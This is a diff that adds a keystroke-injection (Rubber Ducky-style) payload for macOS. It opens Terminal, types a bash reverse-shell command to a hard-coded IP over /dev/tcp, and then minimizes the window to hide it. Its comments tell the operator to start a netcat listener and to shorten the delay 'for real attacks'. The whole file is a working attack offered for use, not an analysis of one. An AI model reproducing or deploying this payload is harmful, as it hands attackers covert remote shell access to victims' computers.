@@ -1,1 +1,23 @@
-Rem
+REM Spawning a reverse shell for MacOS, might work for linux machines
+REM Replace the IP address and Port number with your server's IP address and desired Port number
+REM Initial time delay used as a buffer time in order to be able to delete Payload script. Change to 300 for real attacks
+
+REM On your device, start a listening listening port using the following:
+REM nc -nvl 1234
+REM Make sure you are using the same port as below
+
+DELAY 10000
+COMMAND SPACE
+DELAY 450
+STRING terminal
+ENTER
+DELAY 450
+COMMAND N
+DELAY 250
+STRING bash
+ENTER
+DELAY 250
+STRING bash -i >& /dev/tcp/198.168.1.100/1234 0>&1
+ENTER
+DELAY 200
+COMMAND M
